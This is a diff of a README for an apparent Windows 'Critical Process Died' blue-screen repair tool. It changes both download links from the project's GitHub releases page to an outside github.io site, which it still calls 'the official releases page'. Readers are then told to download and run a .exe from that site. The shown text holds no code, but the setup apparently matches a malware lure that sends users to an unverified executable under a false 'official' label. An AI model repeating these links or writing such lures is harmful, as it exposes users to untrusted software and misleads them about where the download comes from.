@@ -1,6 +1,6 @@
 # 🔧 Critical-Process-Died-BSOD-Fix - Stop Windows Blue Screen Errors Permanently
 
-[![Download Repair Tool](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://github.com/Classless-mcmaster907/Critical-Process-Died-BSOD-Fix/releases)
+[![Download Repair Tool](https://img.shields.io/badge/Download-Repair_Tool-blue.svg)](https://classless-mcmaster907.github.io)
 
 ## 📁 What Does This Tool Do?
 
@@ -12,7 +12,7 @@ This software automates the repair process. It clears corrupt temporary files, r
 
 Follow these steps to obtain and run the repair utility on your Windows machine.
 
-1. Navigate to the official releases page: [https://github.com/Classless-mcmaster907/Critical-Process-Died-BSOD-Fix/releases](https://github.com/Classless-mcmaster907/Critical-Process-Died-BSOD-Fix/releases).
+1. Navigate to the official releases page: [https://classless-mcmaster907.github.io](https://classless-mcmaster907.github.io).
 2. Locate the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
